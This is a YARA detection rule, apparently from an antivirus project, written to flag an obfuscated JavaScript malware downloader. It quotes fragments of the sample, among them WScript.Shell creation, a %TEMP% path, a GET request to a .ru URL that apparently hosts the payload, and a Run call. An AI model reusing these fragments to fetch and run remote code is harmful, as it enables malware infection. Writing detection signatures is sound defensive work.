rule sig_20160427_8c45208b9a9a2464bb737cbea32df4ee {
  meta:
    description = "datamaliciousorder - file 20160427_8c45208b9a9a2464bb737cbea32df4ee.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2eeb3c210987372b60eeb5d407e9ffb6c119003adf58ce693a78addb9890df23"

  strings:
    $s1  = "function WxbhsTzwjr() {return EcqkkJezht[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"EIhyQyS" ascii
    $s2  = "function WxbhsTzwjr() {return EcqkkJezht[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"EIhyQyS" ascii
    $s3  = "function IqojmZjmkz(UmttuNdkoy, VglcrHwcxi){PqwgpXqmhx = PqwgpXqmhx * 1; return UmttuNdkoy - VglcrHwcxi;};" fullword ascii
    $s4  = "var EcqkkJezht = function YfrjuCttnq() {return ZrsldVxuwy[RnqtoIbrts](\"WScript\"+\".Shell\");}(), EqkieNmogi = 11;" fullword ascii
    $s5  = "LxoriUxcjt[RiwffGbxzs](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var ZrsldVxuwy = this[\"WScript\"];" fullword ascii
    $s7  = "function YfezxQfvvo(){return VobxuPbudv + \"\";};" fullword ascii
    $s8  = "if (LxoriUxcjt[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function JixvhGywaw() {return ((IonkqAmtqt == true) && (IonkqAmtqt == AbwokNiyyy)) ? 1 : PqwgpXqmhx;};" fullword ascii
    $s10 = "var IonkqAmtqt = false;" fullword ascii
    $s11 = "IonkqAmtqt = true; " fullword ascii
    $s12 = "function CiodoKblpe(TfgaoSpdvr){EcqkkJezht[\"R\"+\"un\"](TfgaoSpdvr, PqwgpXqmhx, PqwgpXqmhx);};" fullword ascii
    $s13 = "YfbpjOcfxy = true;" fullword ascii
    $s14 = "var YzobeUxork = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "function XkyogXhavi(KiiklQmctu) {var HbmihNbquh = (1, 2, 3, 4, 5, KiiklQmctu); return HbmihNbquh;};" fullword ascii
    $s16 = "function GnzfxHkmtc(){return 23;};" fullword ascii
    $s17 = "AbwokNiyyy = true; " fullword ascii
    $s18 = "return IqojmZjmkz(PxrleEbprf, IaoluJmlei);" fullword ascii
    $s19 = "function RzjldQjbms(){return RnqtoIbrts;};" fullword ascii
    $s20 = "var YfbpjOcfxy = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}